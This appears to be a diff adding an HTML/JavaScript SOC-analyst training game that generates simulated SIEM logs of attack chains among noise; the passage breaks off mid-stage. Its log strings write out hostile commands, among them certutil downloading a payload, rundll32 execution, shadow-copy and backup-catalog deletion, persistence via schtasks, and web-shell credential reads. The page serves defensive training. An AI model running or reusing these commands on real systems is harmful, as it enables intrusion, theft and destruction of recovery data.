@@ -1,0 +1,1576 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>SIEM Correlation Generator — Procedural SOC Analyst Training</title>
+<meta name="description" content="A procedurally generated SIEM log correlation exercise. Fresh attack chains and noise on every load, seeded and shareable. Identify the attack hidden inside routine telemetry.">
+<style>
+  :root {
+    --bg: #f3f5f8;
+    --bg-panel: #ffffff;
+    --bg-console: #0d1117;
+    --bg-console-row-hover: rgba(88, 166, 255, 0.08);
+    --bg-console-row-selected: rgba(88, 166, 255, 0.16);
+    --bg-console-row-correct: rgba(63, 185, 80, 0.18);
+    --bg-console-row-incorrect: rgba(248, 81, 73, 0.28);
+    --bg-console-row-missed: rgba(210, 153, 34, 0.22);
+
+    --fg: #1f2328;
+    --fg-muted: #5a6268;
+    --fg-console: #c9d1d9;
+    --fg-console-time: #58a6ff;
+    --fg-console-source: #d29922;
+    --fg-console-dim: #8b949e;
+
+    --accent: #1f6feb;
+    --accent-hover: #1158c7;
+    --success: #1a7f37;
+    --danger: #cf222e;
+    --warning: #9a6700;
+
+    --border: #d0d7de;
+    --border-strong: #a8b0b9;
+
+    --radius: 8px;
+    --radius-sm: 4px;
+
+    --font-display: ui-serif, 'Iowan Old Style', 'Palatino Linotype', Georgia, serif;
+    --font-body: ui-sans-serif, system-ui, -apple-system, 'Segoe UI', sans-serif;
+    --font-mono: ui-monospace, 'SF Mono', 'JetBrains Mono', Menlo, Consolas, monospace;
+
+    --shadow-sm: 0 1px 2px rgba(15, 23, 42, 0.06), 0 1px 3px rgba(15, 23, 42, 0.05);
+    --shadow-md: 0 4px 12px rgba(15, 23, 42, 0.08);
+  }
+
+  @media (prefers-color-scheme: dark) {
+    :root {
+      --bg: #0a0d12;
+      --bg-panel: #161b22;
+      --bg-console: #010409;
+      --bg-console-row-hover: rgba(88, 166, 255, 0.10);
+      --bg-console-row-selected: rgba(88, 166, 255, 0.22);
+
+      --fg: #e6edf3;
+      --fg-muted: #8b949e;
+
+      --accent: #58a6ff;
+      --accent-hover: #79b8ff;
+      --success: #3fb950;
+      --danger: #f85149;
+      --warning: #d29922;
+
+      --border: #30363d;
+      --border-strong: #484f58;
+
+      --shadow-sm: 0 1px 2px rgba(0, 0, 0, 0.3);
+      --shadow-md: 0 4px 12px rgba(0, 0, 0, 0.4);
+    }
+  }
+
+  * { box-sizing: border-box; }
+  html, body { margin: 0; padding: 0; }
+
+  body {
+    font-family: var(--font-body);
+    background: var(--bg);
+    color: var(--fg);
+    line-height: 1.55;
+    min-height: 100vh;
+    -webkit-font-smoothing: antialiased;
+  }
+
+  .skip-link {
+    position: absolute;
+    left: -9999px;
+    top: 0;
+    background: var(--accent);
+    color: #fff;
+    padding: 8px 14px;
+    z-index: 100;
+    text-decoration: none;
+    border-radius: 0 0 var(--radius-sm) 0;
+  }
+  .skip-link:focus { left: 0; }
+
+  header {
+    background: var(--bg-panel);
+    border-bottom: 1px solid var(--border);
+    padding: 18px 24px;
+  }
+  header .wrap {
+    max-width: 980px;
+    margin: 0 auto;
+    display: flex;
+    align-items: baseline;
+    justify-content: space-between;
+    flex-wrap: wrap;
+    gap: 12px;
+  }
+  header h1 {
+    font-family: var(--font-display);
+    font-weight: 600;
+    font-size: clamp(1.25rem, 2.2vw, 1.6rem);
+    margin: 0;
+    letter-spacing: -0.01em;
+  }
+  header .progress-summary {
+    font-size: 0.85rem;
+    color: var(--fg-muted);
+    font-variant-numeric: tabular-nums;
+  }
+  header .progress-summary strong { color: var(--fg); }
+
+  main {
+    max-width: 980px;
+    margin: 0 auto;
+    padding: 24px;
+  }
+
+  .intro {
+    background: var(--bg-panel);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    padding: 18px 22px;
+    margin-bottom: 22px;
+    box-shadow: var(--shadow-sm);
+  }
+  .intro h2 {
+    margin: 0 0 8px;
+    font-family: var(--font-display);
+    font-size: 1.1rem;
+    font-weight: 600;
+  }
+  .intro p { margin: 0 0 8px; font-size: 0.92rem; color: var(--fg-muted); }
+  .intro p:last-child { margin-bottom: 0; }
+
+  /* Control bar */
+  .controlbar {
+    display: flex;
+    flex-wrap: wrap;
+    align-items: center;
+    gap: 12px;
+    margin-bottom: 18px;
+    padding: 14px 16px;
+    background: var(--bg-panel);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    box-shadow: var(--shadow-sm);
+  }
+  .controlbar .group {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+  }
+  .controlbar label {
+    font-size: 0.82rem;
+    color: var(--fg-muted);
+    font-weight: 500;
+  }
+  .controlbar select,
+  .controlbar input[type="text"] {
+    font-family: var(--font-body);
+    font-size: 0.85rem;
+    padding: 7px 10px;
+    min-height: 38px;
+    border: 1px solid var(--border-strong);
+    border-radius: var(--radius-sm);
+    background: var(--bg);
+    color: var(--fg);
+  }
+  .controlbar input[type="text"] {
+    font-family: var(--font-mono);
+    width: 130px;
+  }
+  .controlbar select:focus-visible,
+  .controlbar input:focus-visible {
+    outline: 2px solid var(--accent);
+    outline-offset: 1px;
+  }
+  .controlbar .spacer { flex: 1 1 auto; }
+
+  .btn {
+    font-family: var(--font-body);
+    font-size: 0.88rem;
+    font-weight: 600;
+    padding: 9px 16px;
+    min-height: 40px;
+    border-radius: var(--radius-sm);
+    border: 1px solid transparent;
+    cursor: pointer;
+    transition: background 0.12s, border-color 0.12s, transform 0.05s;
+  }
+  .btn:active { transform: translateY(1px); }
+  .btn:focus-visible { outline: 2px solid var(--accent); outline-offset: 2px; }
+  .btn-primary { background: var(--accent); color: #fff; }
+  .btn-primary:hover { background: var(--accent-hover); }
+  .btn-primary:disabled { opacity: 0.5; cursor: not-allowed; }
+  .btn-secondary {
+    background: var(--bg-panel);
+    color: var(--fg);
+    border-color: var(--border-strong);
+  }
+  .btn-secondary:hover { border-color: var(--accent); background: var(--bg-console-row-hover); }
+
+  /* Scenario panel */
+  .scenario {
+    background: var(--bg-panel);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    padding: 22px 24px;
+    box-shadow: var(--shadow-md);
+  }
+  .scenario-header {
+    display: flex;
+    align-items: flex-start;
+    justify-content: space-between;
+    flex-wrap: wrap;
+    gap: 10px;
+    margin-bottom: 4px;
+  }
+  .scenario-title {
+    font-family: var(--font-display);
+    font-size: 1.25rem;
+    font-weight: 600;
+    margin: 0;
+    letter-spacing: -0.01em;
+  }
+  .scenario-meta {
+    display: flex;
+    gap: 8px;
+    flex-wrap: wrap;
+    align-items: center;
+  }
+  .meta-chip {
+    font-size: 0.72rem;
+    font-weight: 600;
+    text-transform: uppercase;
+    letter-spacing: 0.04em;
+    padding: 4px 9px;
+    border-radius: 999px;
+    background: var(--bg);
+    border: 1px solid var(--border);
+    color: var(--fg-muted);
+  }
+  .meta-chip.diff-1 { color: var(--success); border-color: var(--success); }
+  .meta-chip.diff-2 { color: var(--warning); border-color: var(--warning); }
+  .meta-chip.diff-3 { color: var(--danger); border-color: var(--danger); }
+  .meta-chip.seed { font-family: var(--font-mono); text-transform: none; }
+  .meta-chip.composed { color: var(--accent); border-color: var(--accent); }
+
+  .briefing {
+    font-size: 0.95rem;
+    color: var(--fg-muted);
+    margin: 12px 0 18px;
+    padding-left: 14px;
+    border-left: 3px solid var(--accent);
+  }
+
+  /* Console */
+  .console {
+    background: var(--bg-console);
+    border-radius: var(--radius-sm);
+    padding: 6px 0;
+    font-family: var(--font-mono);
+    font-size: 0.82rem;
+    line-height: 1.5;
+    overflow-x: auto;
+    border: 1px solid var(--border-strong);
+  }
+  .log-row {
+    display: flex;
+    gap: 10px;
+    align-items: baseline;
+    padding: 4px 14px 4px 12px;
+    cursor: pointer;
+    border-left: 3px solid transparent;
+    white-space: nowrap;
+    transition: background 0.08s;
+  }
+  .log-row:hover { background: var(--bg-console-row-hover); }
+  .log-row:focus-visible {
+    outline: 2px solid var(--accent);
+    outline-offset: -2px;
+  }
+  .log-row.selected {
+    background: var(--bg-console-row-selected);
+    border-left-color: var(--accent);
+  }
+  .log-row .marker {
+    flex: 0 0 14px;
+    font-weight: 700;
+    text-align: center;
+  }
+  .log-row.revealed-correct {
+    background: var(--bg-console-row-correct);
+    border-left-color: var(--success);
+  }
+  .log-row.revealed-correct .marker { color: var(--success); }
+  .log-row.revealed-incorrect {
+    background: var(--bg-console-row-incorrect);
+    border-left-color: var(--danger);
+  }
+  .log-row.revealed-incorrect .marker { color: var(--danger); }
+  .log-row.revealed-missed {
+    background: var(--bg-console-row-missed);
+    border-left-color: var(--warning);
+  }
+  .log-row.revealed-missed .marker { color: var(--warning); }
+  .log-row.submitted { cursor: default; }
+
+  .log-row .time { color: var(--fg-console-time); flex: 0 0 auto; }
+  .log-row .source { color: var(--fg-console-source); flex: 0 0 auto; }
+  .log-row .msg { color: var(--fg-console); flex: 1 1 auto; }
+
+  /* Controls under console */
+  .controls {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    margin-top: 16px;
+    flex-wrap: wrap;
+  }
+  .selection-count {
+    font-size: 0.85rem;
+    color: var(--fg-muted);
+    font-variant-numeric: tabular-nums;
+  }
+  .controls .spacer { flex: 1 1 auto; }
+
+  /* Feedback */
+  .feedback {
+    margin-top: 18px;
+    padding: 18px 20px;
+    border-radius: var(--radius);
+    border: 1px solid var(--border);
+    background: var(--bg);
+  }
+  .feedback.score-perfect { border-color: var(--success); }
+  .feedback.score-good { border-color: var(--success); }
+  .feedback.score-partial { border-color: var(--warning); }
+  .feedback.score-poor { border-color: var(--danger); }
+  .feedback h4 {
+    margin: 0 0 8px;
+    font-family: var(--font-display);
+    font-size: 1.05rem;
+  }
+  .score-line {
+    font-size: 0.88rem;
+    color: var(--fg-muted);
+    margin-bottom: 12px;
+    font-variant-numeric: tabular-nums;
+  }
+  .score-line strong { color: var(--fg); }
+  .explanation {
+    font-size: 0.92rem;
+    margin: 0 0 14px;
+  }
+  .explanation code,
+  .kill-chain code {
+    font-family: var(--font-mono);
+    font-size: 0.85em;
+    background: var(--bg-console-row-selected);
+    padding: 1px 5px;
+    border-radius: 3px;
+  }
+  .kill-chain h5 {
+    margin: 0 0 8px;
+    font-size: 0.82rem;
+    text-transform: uppercase;
+    letter-spacing: 0.05em;
+    color: var(--fg-muted);
+  }
+  .kill-chain ol {
+    margin: 0;
+    padding-left: 4px;
+    list-style: none;
+    counter-reset: stage;
+  }
+  .kill-chain li {
+    position: relative;
+    padding: 6px 0 6px 30px;
+    font-size: 0.9rem;
+    counter-increment: stage;
+    border-bottom: 1px solid var(--border);
+  }
+  .kill-chain li:last-child { border-bottom: none; }
+  .kill-chain li::before {
+    content: counter(stage);
+    position: absolute;
+    left: 0;
+    top: 6px;
+    width: 20px;
+    height: 20px;
+    line-height: 20px;
+    text-align: center;
+    font-size: 0.72rem;
+    font-weight: 700;
+    border-radius: 50%;
+    background: var(--accent);
+    color: #fff;
+  }
+  .kill-chain .stage {
+    display: inline-block;
+    font-size: 0.68rem;
+    font-weight: 700;
+    text-transform: uppercase;
+    letter-spacing: 0.05em;
+    color: var(--accent);
+    margin-right: 8px;
+    font-family: var(--font-mono);
+  }
+
+  .hint-line {
+    font-size: 0.84rem;
+    color: var(--fg-muted);
+    margin-top: 12px;
+    font-style: italic;
+  }
+
+  footer {
+    max-width: 980px;
+    margin: 0 auto;
+    padding: 20px 24px 40px;
+    font-size: 0.78rem;
+    color: var(--fg-muted);
+  }
+  footer .program { color: var(--fg); font-weight: 600; }
+
+  @media (max-width: 640px) {
+    main { padding: 16px; }
+    .scenario { padding: 18px 16px; }
+    .console { font-size: 0.74rem; }
+    .controlbar input[type="text"] { width: 100px; }
+  }
+
+  @media (prefers-reduced-motion: reduce) {
+    * { transition: none !important; animation: none !important; }
+  }
+</style>
+</head>
+<body>
+<a href="#main" class="skip-link">Skip to main content</a>
+
+<header>
+  <div class="wrap">
+    <h1>SIEM Correlation Generator</h1>
+    <div class="progress-summary" aria-live="polite">
+      Attempts: <strong id="attemptCount">0</strong>
+      &nbsp;·&nbsp; Best score: <strong id="bestScore">—</strong>
+    </div>
+  </div>
+</header>
+
+<main id="main">
+  <section class="intro" aria-label="Instructions">
+    <h2>Every load is a fresh case.</h2>
+    <p>A new attack chain is procedurally generated and hidden inside a stream of routine network and security telemetry. The malicious events are real; so is the noise &mdash; much of it deliberately resembles the attack. Click each log line you believe belongs to the attack chain, then check your correlation against the reconstructed analyst notes.</p>
+    <p>Choose one of ten classic attack types, let it pick at random, or select <strong>Composed (procedural)</strong> &mdash; which assembles a novel chain by combining individual attack stages under realistic ordering rules, so you face combinations you've never seen. The same <strong>seed</strong> always produces the same case, so you can share an exact scenario with a colleague or compare answers.</p>
+  </section>
+
+  <div class="controlbar">
+    <div class="group">
+      <label for="attackSelect">Attack type</label>
+      <select id="attackSelect" aria-label="Attack type"></select>
+    </div>
+    <div class="group">
+      <label for="difficultySelect">Difficulty</label>
+      <select id="difficultySelect" aria-label="Difficulty">
+        <option value="1">Beginner</option>
+        <option value="2" selected>Intermediate</option>
+        <option value="3">Advanced</option>
+      </select>
+    </div>
+    <div class="group">
+      <label for="seedInput">Seed</label>
+      <input type="text" id="seedInput" aria-label="Seed value" inputmode="numeric" autocomplete="off">
+    </div>
+    <div class="spacer"></div>
+    <button type="button" class="btn btn-secondary" id="applyBtn">Load seed</button>
+    <button type="button" class="btn btn-primary" id="newBtn">New case</button>
+  </div>
+
+  <section class="scenario" id="scenarioPanel" aria-live="polite">
+    <!-- rendered by JS -->
+  </section>
+</main>
+
+<footer>
+  <p>Built for <span class="program">SOC Analyst Training</span> &middot; procedurally generated practice &middot; 2026</p>
+</footer>
+
+<script>
+"use strict";
+
+// ============================================================
+// SIEM CORRELATION GENERATOR — ENGINE CORE v2
+// Stage-library architecture supporting BOTH fixed templates
+// (faithful reconstructions) and constrained compositional
+// generation (novel chains assembled from reusable stages).
+// ============================================================
+
+// ---- Seeded PRNG (mulberry32) ------------------------------
+function makeRng(seed) {
+  let a = seed >>> 0;
+  return function () {
+    a |= 0; a = (a + 0x6D2B79F5) | 0;
+    let t = Math.imul(a ^ (a >>> 15), 1 | a);
+    t = (t + Math.imul(t ^ (t >>> 7), 61 | t)) ^ t;
+    return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
+  };
+}
+function rngTools(rng) {
+  const r = {
+    next: rng,
+    int: (min, max) => Math.floor(rng() * (max - min + 1)) + min,
+    pick: (arr) => arr[Math.floor(rng() * arr.length)],
+    chance: (p) => rng() < p,
+    shuffle: (arr) => {
+      const a = arr.slice();
+      for (let i = a.length - 1; i > 0; i--) {
+        const j = Math.floor(rng() * (i + 1));
+        [a[i], a[j]] = [a[j], a[i]];
+      }
+      return a;
+    },
+    sample: (arr, k) => r.shuffle(arr).slice(0, k)
+  };
+  return r;
+}
+
+// ---- Entity pools ------------------------------------------
+const POOL = {
+  firstNames: ["james","aisha","tomas","priya","liam","sofia","marcus","yuki","omar","elena","noah","fatima","derek","mei","raj","clara","viktor","amara","sean","nadia"],
+  lastNames: ["morgan","chen","bauer","rashid","alvarez","novak","okafor","kim","santos","muller","ivanov","haddad","walsh","tanaka","brooks","petrov","diallo","reyes","kowalski","nguyen"],
+  hostPrefixes: ["WKSTN","HOST","LAPTOP","DESK","NODE","ENDPT"],
+  depts: ["FIN","HR","ENG","MKT","LEG","OPS","SALES","IT","RND","EXEC"],
+  servers: ["DC-01","DC-02","FS01","SQL-PROD","SQL-HR","WEB-SRV-02","APP-01","VAULT-01","BACKUP-01","MAIL-01"],
+  svcAccounts: ["svc_backup","svc_jenkins","svc_sql","svc_iis","svc_monitor","svc_deploy","svc_scan"],
+  torNotes: ["Tor exit node, Estonia","Tor exit node, Romania","Tor exit node, Netherlands","Tor exit node, Iceland","known VPN egress, Seychelles","bulletproof host, Moldova"],
+  evilDomains: ["update-svc.xyz","cdn-sync.live","secure-portal.app","cloud-relay.io","mx-delivery.co","api-telemetry.net","sync-agent.org"],
+  benignDomains: ["github.com","registry.npmjs.org","login.microsoftonline.com","update.microsoft.com","slack.com","zoom.us","dropbox.com","sharepoint.com","cdn.jsdelivr.net"],
+  cloudUploads: ["upload.mega.nz","drive.google.com","wetransfer.com","dropbox.com","file.io"],
+  usbVendors: ["SanDisk","Kingston","Samsung","Seagate","WD"]
+};
+
+function buildIdentity(R) {
+  const fn = R.pick(POOL.firstNames);
+  const ln = R.pick(POOL.lastNames);
+  const dept = R.pick(POOL.depts);
+  const hostPrefix = R.pick(POOL.hostPrefixes);
+  const hostNum = String(R.int(1, 48)).padStart(2, "0");
+  return {
+    user: `${fn[0]}.${ln}`,
+    userFull: `${fn} ${ln}`,
+    host: `${hostPrefix}-${dept}-${hostNum}`,
+    laptop: `LAPTOP-${ln.toUpperCase()}`,
+    dept
+  };
+}
+function buildEvilIp(R) {
+  const blocks = [
+    () => `185.220.${R.int(100,103)}.${R.int(2,254)}`,
+    () => `45.${R.int(61,95)}.${R.int(2,254)}.${R.int(2,254)}`,
+    () => `91.218.${R.int(100,120)}.${R.int(2,254)}`,
+    () => `23.106.${R.int(200,230)}.${R.int(2,254)}`,
+    () => `104.28.${R.int(20,60)}.${R.int(2,254)}`,
+    () => `198.51.100.${R.int(2,254)}`
+  ];
+  return R.pick(blocks)();
+}
+function buildInternalIp(R) {
+  return `10.${R.int(0,40)}.${R.int(0,250)}.${R.int(2,254)}`;
+}
+
+// ---- Clock -------------------------------------------------
+function makeClock(R) {
+  let h = R.int(0, 23), m = R.int(0, 59), s = R.int(0, 59);
+  const fmt = () => [h, m, s].map(n => String(n).padStart(2, "0")).join(":");
+  return {
+    now: fmt,
+    advance: (maxSec) => {
+      s += R.int(1, maxSec);
+      while (s >= 60) { s -= 60; m++; }
+      while (m >= 60) { m -= 60; h = (h + 1) % 24; }
+      return fmt();
+    }
+  };
+}
+function tToSeconds(t) {
+  const [h, m, s] = t.split(":").map(Number);
+  return h * 3600 + m * 60 + s;
+}
+
+const STAGE_LABELS = {
+  recon: "recon", access: "initial access", execution: "execution",
+  persistence: "persistence", lateral: "lateral movement",
+  exfil: "exfiltration", impact: "impact", c2: "command & control",
+  credaccess: "credential access"
+};
+
+// Phase ordering — used by the composer to keep chains coherent.
+// Lower number = earlier in a kill chain.
+const PHASE_ORDER = {
+  access: 1, execution: 2, c2: 2, credaccess: 3, recon: 3,
+  persistence: 4, lateral: 5, exfil: 6, impact: 6
+};
+
+// ============================================================
+// STAGE LIBRARY
+// Each stage is a builder: (R, ctx) -> { events:[...], note:{stage,description} }
+// Events carry malicious:true and a stage tag. `note` feeds the
+// reconstructed kill chain. Stages declare a `phase` (for ordering)
+// and `tags` (for compatibility checks during composition).
+// `produces` / `requires` let the composer chain causally
+// (e.g. a stage that needs a foothold requires "foothold").
+// ============================================================
+const STAGES = {
+
+  torLogin: {
+    phase: "access", tags: ["identity"], produces: ["foothold","creds"],
+    build: (R, ctx) => {
+      const tor = R.pick(POOL.torNotes);
+      const fails = R.int(8, 19);
+      const e1 = { time: ctx.clock.now(), source: "O365-AUTH", stage: "access",
+        msg: `FAIL login user=${ctx.id.user} src=${ctx.evilIp} (${tor})`, malicious: true };
+      const e2 = { time: ctx.clock.advance(40), source: "O365-AUTH", stage: "access",
+        msg: `SUCCESS login user=${ctx.id.user} src=${ctx.evilIp} (after ${fails} failed attempts)`, malicious: true };
+      return { events: [e1, e2],
+        note: { stage: "access", description: `Brute-force then successful login to ${ctx.id.user} from a hostile IP.` } };
+    }
+  },
+
+  mfaFatigue: {
+    phase: "access", tags: ["identity"], produces: ["foothold","creds"],
+    build: (R, ctx) => {
+      const denies = R.int(12, 28);
+      const ev = [];
+      ev.push({ time: ctx.clock.now(), source: "AAD-MFA", stage: "access",
+        msg: `MFA push DENY user=${ctx.id.user} src=${ctx.evilIp} (unknown ASN)`, malicious: true });
+      ev.push({ time: ctx.clock.advance(30), source: "AAD-MFA", stage: "access",
+        msg: `MFA push DENY user=${ctx.id.user} src=${ctx.evilIp} (4th attempt in 60s)`, malicious: true });
+      ev.push({ time: ctx.clock.advance(30), source: "AAD-MFA", stage: "access",
+        msg: `MFA push DENY user=${ctx.id.user} src=${ctx.evilIp} (${denies-4}th attempt)`, malicious: true });
+      ev.push({ time: ctx.clock.advance(40), source: "AAD-MFA", stage: "access",
+        msg: `MFA push APPROVE user=${ctx.id.user} src=${ctx.evilIp} (after ${denies} denies)`, malicious: true });
+      return { events: ev,
+        note: { stage: "access", description: `Repeated MFA push spam until the user finally approves (MFA fatigue).` } };
+    }
+  },
+
+  phishConsent: {
+    phase: "access", tags: ["identity","oauth"], produces: ["foothold","oauthtoken"],
+    build: (R, ctx) => {
+      const evil = R.pick(POOL.evilDomains);
+      const app = R.pick(["DocuSign Secure Sign","Adobe Cloud Connect","Microsoft Teams Helper","Zoom Scheduler Pro","Mailbox Optimizer"]);
+      return { events: [
+        { time: ctx.clock.now(), source: "EMAIL", stage: "access",
+          msg: `Inbound to ${ctx.id.user} subject:"Action Required: review" sender:secure@${evil}`, malicious: true },
+        { time: ctx.clock.advance(40), source: "PROXY", stage: "access",
+          msg: `GET https://${evil}/auth?id=${R.int(1000,9999)} from ${ctx.id.host} user=${ctx.id.user}`, malicious: true },
+        { time: ctx.clock.advance(30), source: "AAD-CONSENT", stage: "access",
+          msg: `OAuth consent prompted: app "${app}" requests Mail.Read, Mail.Send, Files.Read.All, offline_access; user=${ctx.id.user}`, malicious: true, _app: app },
+        { time: ctx.clock.advance(20), source: "AAD-CONSENT", stage: "persistence",
+          msg: `OAuth consent GRANTED user=${ctx.id.user} \u2192 app "${app}" (publisher unverified)`, malicious: true, _app: app }
+      ], note: { stage: "access", description: `Phishing leads to OAuth consent for an unverified app with sensitive scopes — token persists across MFA.` }, ctxSet: { app } };
+    }
+  },
+
+  macroExec: {
+    phase: "execution", tags: ["endpoint"], requires: [], produces: ["foothold","beaconhost"],
+    build: (R, ctx) => ({
+      events: [{ time: ctx.clock.now(), source: "EDR", stage: "execution",
+        msg: `rundll32.exe spawned by winword.exe on ${ctx.id.host}, parent: outlook.exe`, malicious: true }],
+      note: { stage: "execution", description: `Office macro spawns rundll32 — malicious document opened.` }
+    })
+  },
+
+  encodedPs: {
+    phase: "execution", tags: ["endpoint"], requires: ["foothold"], produces: ["beaconhost"],
+    build: (R, ctx) => ({
+      events: [{ time: ctx.clock.now(), source: "EDR", stage: "execution",
+        msg: `PowerShell base64-encoded execution on ${ctx.id.host}, user context ${ctx.id.user}`, malicious: true }],
+      note: { stage: "execution", description: `Encoded PowerShell run in the compromised user's context.` }
+    })
+  },
+
+  lolbinDownload: {
+    phase: "execution", tags: ["endpoint","lolbin"], produces: ["foothold","beaconhost","payload"],
+    build: (R, ctx) => {
+      const src = R.pick(["transfer.sh","pastebin.com","raw.githubusercontent.com","drive.google.com"]);
+      return { events: [
+        { time: ctx.clock.now(), source: "EDR", stage: "execution",
+          msg: `certutil.exe -urlcache -split -f https://${src}/${R.int(1000,9999)}/payload.txt C:\\ProgramData\\update.dll on ${ctx.id.host}`, malicious: true },
+        { time: ctx.clock.advance(45), source: "EDR", stage: "execution",
+          msg: `rundll32.exe C:\\ProgramData\\update.dll,StartW on ${ctx.id.host}`, malicious: true }
+      ], note: { stage: "execution", description: `LOLBin abuse: certutil downloads a payload, rundll32 executes it (signed binaries evade AV).` } };
+    }
+  },
+
+  npmCompromise: {
+    phase: "execution", tags: ["ci","supplychain"], produces: ["foothold","beaconhost","cikey"],
+    build: (R, ctx) => {
+      const runner = `runner-${String(R.int(1,12)).padStart(2,"0")}`;
+      ctx.runner = runner;
+      return { events: [
+        { time: ctx.clock.now(), source: "PROXY", stage: "execution",
+          msg: `GET https://registry.npmjs.org/event-stream/-/event-stream-3.3.6.tgz from ${runner}`, malicious: true },
+        { time: ctx.clock.advance(5), source: "PROXY", stage: "execution",
+          msg: `GET https://registry.npmjs.org/flatmap-stream/-/flatmap-stream-0.1.1.tgz from ${runner} (transitive)`, malicious: true },
+        { time: ctx.clock.advance(60), source: "EDR", stage: "execution",
+          msg: `node.exe spawned child process: powershell -nop -w hidden on ${runner}`, malicious: true }
+      ], note: { stage: "execution", description: `Malicious transitive npm dependency runs a hidden PowerShell during CI install.` } };
+    }
+  },
+
+  c2beacon: {
+    phase: "c2", tags: ["network"], requires: ["beaconhost"], produces: ["c2"],
+    build: (R, ctx) => {
+      const port = R.pick(["443","8443","8080"]);
+      const interval = R.pick(["60s","5 min","30s","2 min"]);
+      const host = ctx.runner || ctx.id.host;
+      return { events: [{ time: ctx.clock.now(), source: "FIREWALL", stage: "c2",
+        msg: `ALLOW ${host} \u2192 ${ctx.evilIp}:${port} (beacon pattern, ${interval} intervals)`, malicious: true }],
+        note: { stage: "c2", description: `Regular-interval beacon to attacker infrastructure.` } };
+    }
+  },
+
+  adRecon: {
+    phase: "recon", tags: ["windows","ad"], requires: ["foothold"], produces: ["domainview"],
+    build: (R, ctx) => ({
+      events: [
+        { time: ctx.clock.now(), source: "EDR", stage: "recon",
+          msg: `Process: net.exe group "Domain Admins" /domain on ${ctx.id.host}`, malicious: true },
+        { time: ctx.clock.advance(40), source: "EDR", stage: "recon",
+          msg: `Process: nltest.exe /dclist on ${ctx.id.host}`, malicious: true }
+      ], note: { stage: "recon", description: `Active Directory enumeration of admins and domain controllers.` }
+    })
+  },
+
+  kerberoast: {
+    phase: "credaccess", tags: ["windows","ad"], requires: ["foothold"], produces: ["svccreds"],
+    build: (R, ctx) => {
+      const svc = R.sample(POOL.svcAccounts, 3);
+      ctx.crackedSvc = svc[0];
+      const ev = [];
+      ev.push({ time: ctx.clock.now(), source: "WINDOWS-DC", stage: "credaccess",
+        msg: `Event 4769 TGS request user=${ctx.id.user} service=MSSQL/sql-prod enc=0x17 (RC4)`, malicious: true });
+      svc.forEach(s => ev.push({ time: ctx.clock.advance(3), source: "WINDOWS-DC", stage: "credaccess",
+        msg: `Event 4769 TGS request user=${ctx.id.user} service=${s} enc=0x17 (RC4)`, malicious: true }));
+      return { events: ev,
+        note: { stage: "credaccess", description: `Kerberoasting — burst of RC4 TGS requests to crack service-account hashes offline.` } };
+    }
+  },
+
+  inboxRule: {
+    phase: "persistence", tags: ["m365"], requires: ["foothold"], produces: ["mailpersist"],
+    build: (R, ctx) => ({
+      events: [{ time: ctx.clock.now(), source: "EXO-MAILBOX", stage: "persistence",
+        msg: `Inbox rule created user=${ctx.id.user}: move messages from "Finance" to RSS Feeds, mark read`, malicious: true }],
+      note: { stage: "persistence", description: `Hidden inbox rule conceals the attacker's activity from the user.` }
+    })
+  },
+
+  dualPersist: {
+    phase: "persistence", tags: ["windows"], requires: ["payload"], produces: ["persist"],
+    build: (R, ctx) => ({
+      events: [
+        { time: ctx.clock.now(), source: "EDR", stage: "persistence",
+          msg: `schtasks.exe /create /tn "Adobe Update Service" /tr "rundll32 C:\\ProgramData\\update.dll,StartW" /sc onlogon on ${ctx.id.host}`, malicious: true },
+        { time: ctx.clock.advance(50), source: "EDR", stage: "persistence",
+          msg: `reg.exe add HKCU\\...\\Run /v AdobeUpd /d ... on ${ctx.id.host} user=${ctx.id.user}`, malicious: true }
+      ], note: { stage: "persistence", description: `Dual persistence: scheduled task plus Run key (removing one leaves the other).` }
+    })
+  },
+
+  webShell: {
+    phase: "persistence", tags: ["web"], produces: ["shell","foothold"],
+    build: (R, ctx) => {
+      const shell = R.pick(["invoice.php","upload.php","status.php","img.php","temp.aspx"]);
+      ctx.shell = shell;
+      return { events: [{ time: ctx.clock.now(), source: "WEB", stage: "persistence",
+        msg: `POST /portal/upload/${shell} from ${ctx.evilIp} (web shell uploaded)`, malicious: true }],
+        note: { stage: "persistence", description: `A web shell is uploaded to a writable directory.` } };
+    }
+  },
+
+  shellCmds: {
+    phase: "recon", tags: ["web"], requires: ["shell"], produces: ["dbcreds"],
+    build: (R, ctx) => {
+      const shell = ctx.shell || "invoice.php";
+      return { events: [
+        { time: ctx.clock.now(), source: "WEB", stage: "execution",
+          msg: `GET /portal/upload/${shell}?cmd=whoami from ${ctx.evilIp}, 200 OK`, malicious: true },
+        { time: ctx.clock.advance(20), source: "WEB", stage: "recon",
+          msg: `GET /portal/upload/${shell}?cmd=ls+/etc from ${ctx.evilIp}, 200 OK`, malicious: true },
+        { time: ctx.clock.advance(30), source: "WEB", stage: "access",
+          msg: `GET /portal/upload/${shell}?cmd=cat+config/db.conf from ${ctx.evilIp}, 200 OK`, malicious: true }
+      ], note: { stage: "recon", description: `Commands run through the shell; DB credentials read from a config file.` } };
+    }
+  },
+
+  lateralDC: {
+    phase: "lateral", tags: ["windows","ad"], requires: ["foothold"], produces: ["dcaccess"],
+    build: (R, ctx) => {
+      const svc = ctx.crackedSvc || R.pick(POOL.svcAccounts);
+      const dc = R.pick(["DC-01","DC-02"]);
+      ctx.dc = dc;
+      return { events: [{ time: ctx.clock.now(), source: "WINDOWS", stage: "lateral",
+        msg: `Event 4624 logon type 3 to ${dc} from ${ctx.id.host}, user=${svc}`, malicious: true }],
+        note: { stage: "lateral", description: `Logon to a domain controller using a service account.` } };
+    }
+  },
+
+  shadowDelete: {
+    phase: "impact", tags: ["windows"], requires: ["foothold"], produces: [],
+    build: (R, ctx) => {
+      const dc = ctx.dc || ctx.id.host;
+      return { events: [
+        { time: ctx.clock.now(), source: "EDR", stage: "impact",
+          msg: `Process: vssadmin.exe delete shadows /all /quiet on ${dc}`, malicious: true },
+        { time: ctx.clock.advance(40), source: "EDR", stage: "impact",
+          msg: `Process: wbadmin.exe delete catalog -quiet on ${dc}`, malicious: true }
+      ], note: { stage: "impact", description: `Shadow copies and backup catalog deleted to prevent recovery.` } };
+    }
+  },
+
+  ntdsDump: {
